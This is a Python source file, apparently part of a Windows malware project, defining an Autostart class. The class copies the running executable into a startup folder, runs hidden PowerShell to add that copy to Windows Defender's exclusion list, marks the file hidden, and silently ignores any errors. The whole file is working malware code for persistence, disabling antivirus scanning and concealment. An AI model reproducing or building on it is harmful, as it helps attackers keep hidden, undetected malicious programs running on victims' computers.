from ctypes import windll
from os import path, remove
from shutil import copyfile
from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE

from helper.helpers.config import AutostartConfig


class Autostart:
    """
    Adds the file to autostart.
    """
    def __init__(self, executor_path: str):

        self.__executor_path = executor_path
        self.__config = AutostartConfig()
        self.__autostart_path = path.join(self.__config.AutostartPath, f"{self.__config.AutostartName}.exe")

    def __add_to_autostart(self) -> None:
        """
        Creates a copy of the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__autostart_path):
            remove(self.__autostart_path)

        copyfile(self.__executor_path, self.__autostart_path)

    def __exclude_from_defender(self) -> None:
        """
        Trying to exclude a file from Windows Defender checks.

        Parameters:
        - None.

        Returns:
        - None.
        """
        Popen(
            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__autostart_path}'",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def __hide_file(self) -> None:
        """
        Makes a file hidden.

        Parameters:
        - None.

        Returns:
        - None.
        """
        windll.kernel32.SetFileAttributesW(self.__autostart_path, 2)

    def run(self) -> None:
        """
        Launches the autostart module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__add_to_autostart()
            self.__exclude_from_defender()
            self.__hide_file()

        except Exception as e:
            pass
